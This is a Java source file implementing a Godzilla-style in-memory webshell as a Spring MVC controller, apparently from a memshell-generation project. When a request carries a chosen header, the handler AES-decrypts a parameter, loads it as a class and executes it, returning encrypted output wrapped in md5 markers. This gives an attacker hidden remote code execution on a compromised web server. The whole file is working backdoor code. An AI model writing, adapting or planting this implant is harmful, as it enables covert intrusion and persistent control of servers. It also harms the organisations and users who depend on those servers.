package com.reajason.javaweb.memshell.shelltool.godzilla;

import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.Controller;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
public class GodzillaControllerHandler extends ClassLoader implements Controller {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    public GodzillaControllerHandler() {
    }

    public GodzillaControllerHandler(ClassLoader parent) {
        super(parent);
    }

    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception {
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                HttpSession session = request.getSession();
                byte[] data = base64Decode(request.getParameter(pass));
                data = this.x(data, false);
                Object cache = session.getAttribute(key);
                if (cache == null) {
                    session.setAttribute(key, (new GodzillaControllerHandler(Thread.currentThread().getContextClassLoader())).defineClass(data, 0, data.length));
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) cache).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    response.getWriter().write(md5.substring(0, 16));
                    response.getWriter().write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    response.getWriter().write(md5.substring(16));
                }
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return null;
    }


    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher c = Cipher.getInstance("AES");
        c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return c.doFinal(s);
    }
}
